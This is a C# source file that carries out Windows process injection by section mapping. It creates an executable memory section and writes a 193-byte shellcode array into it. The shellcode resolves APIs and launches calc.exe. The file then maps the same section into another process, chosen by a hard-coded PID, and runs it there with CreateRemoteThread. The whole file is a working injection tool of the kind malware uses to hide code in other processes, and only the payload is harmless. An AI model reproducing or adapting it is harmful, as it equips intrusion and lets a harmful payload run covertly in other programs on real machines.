using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.Diagnostics;

namespace sectionmap
{
    public partial class Program
    {


        



        public static void Main(string[] args)
        {

            const UInt32 STANDARD_RIGHTS_REQUIRED = 0x000F0000;
            const UInt32 SECTION_QUERY = 0x0001;
            const UInt32 SECTION_MAP_WRITE = 0x0002;
            const UInt32 SECTION_MAP_READ = 0x0004;
            const UInt32 SECTION_MAP_EXECUTE = 0x0008;
            const UInt32 SECTION_EXTEND_SIZE = 0x0010;
            const UInt32 SECTION_ALL_ACCESS = (STANDARD_RIGHTS_REQUIRED | SECTION_QUERY |
                SECTION_MAP_WRITE |
                SECTION_MAP_READ |
                SECTION_MAP_EXECUTE |
                SECTION_EXTEND_SIZE);
            const UInt32 FILE_MAP_ALL_ACCESS = SECTION_ALL_ACCESS;


            byte[] payload = new byte[193] {
0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,
0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,
0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,
0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,
0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,
0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,
0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,
0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,
0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,
0x8d,0x5d,0x6a,0x01,0x8d,0x85,0xb2,0x00,0x00,0x00,0x50,0x68,0x31,0x8b,0x6f,
0x87,0xff,0xd5,0xbb,0xe0,0x1d,0x2a,0x0a,0x68,0xa6,0x95,0xbd,0x9d,0xff,0xd5,
0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,
0x00,0x53,0xff,0xd5,0x63,0x61,0x6c,0x63,0x2e,0x65,0x78,0x65,0x00 };



            IntPtr sectionhandle;
            uint maxsize = 0x100;
            int res = NtCreateSection(
                out sectionhandle,
                SECTION_ALL_ACCESS,
                IntPtr.Zero,
                ref maxsize,
                0x40,
                0x8000000 ,
                IntPtr.Zero
                );

            if (sectionhandle == IntPtr.Zero)
            {
                Console.WriteLine("Error: {0}",res);
            }
            else
            {
                Console.WriteLine(sectionhandle);

                IntPtr baseaddress = IntPtr.Zero;
                UIntPtr zerobits = UIntPtr.Zero;
                ulong sectionoffset=0;
                uint viewsize=0;
                UIntPtr commitsize = UIntPtr.Zero;

                int res2 = NtMapViewOfSection(
                    sectionhandle,
                    Process.GetCurrentProcess().Handle,
                    ref baseaddress,
                    zerobits,
                    commitsize,
                    ref sectionoffset,
                   ref viewsize,
                   2,
                    0,
                   0x40
                    );

                if (baseaddress.ToInt64() == 0)
                {
                    Console.WriteLine("error: {0}",res2);
                }
                else
                {
                    Console.WriteLine("Baseaddress: {0}",baseaddress.ToString("X"));

                    //byte[] temp = Encoding.ASCII.GetBytes("hi");

                    Marshal.Copy(payload, 0, baseaddress, payload.Length);


                    UInt32 threadid;

                    UInt32 processallaccess = 0x000F0000 | 0x00100000 | 0xFFFF;

                    uint pid = 12356;

                    IntPtr prochandle = OpenProcess(processallaccess, false,pid);
                    IntPtr remotebase = IntPtr.Zero;
                    ulong offset = 0;
                    uint viewsize2 = 0;

                    int res3 = NtMapViewOfSection(
                        sectionhandle,
                        prochandle,
                        ref remotebase,
                        UIntPtr.Zero,
                        UIntPtr.Zero,
                        ref offset,
                        ref viewsize2,
                        2,
                        0,
                       0x40
                        );

                    

                    if (remotebase != IntPtr.Zero)
                    {
                        Console.WriteLine("remotebase: {0}",remotebase.ToString("X"));
                        IntPtr threadhandle =CreateRemoteThread(
                            prochandle,
                            IntPtr.Zero,
                            0,
                            remotebase,
                            IntPtr.Zero,
                            0,
                            out threadid
                            );
                        Console.WriteLine(Marshal.GetLastWin32Error());
                        if (threadid == 0)
                        {
                            Console.WriteLine(Marshal.GetLastWin32Error());
                        }
                        Console.WriteLine("Threadid: {0}", threadid);


                        NtUnmapViewOfSection(prochandle, remotebase);
                    
                    
                    }
                    else
                    {
                        Console.WriteLine("Error for createremotethread: {0}",Marshal.GetLastWin32Error());
                    }
                    /*IntPtr threadhandle=CreateThread(
                        IntPtr.Zero,
                        0,
                        baseaddress,
                        IntPtr.Zero,
                        0,
                        out threadid
                        );*/

                    
                    NtUnmapViewOfSection(Process.GetCurrentProcess().Handle, baseaddress);
                }


                NtClose(sectionhandle);
            }





            Console.ReadKey();

        }
    }
}
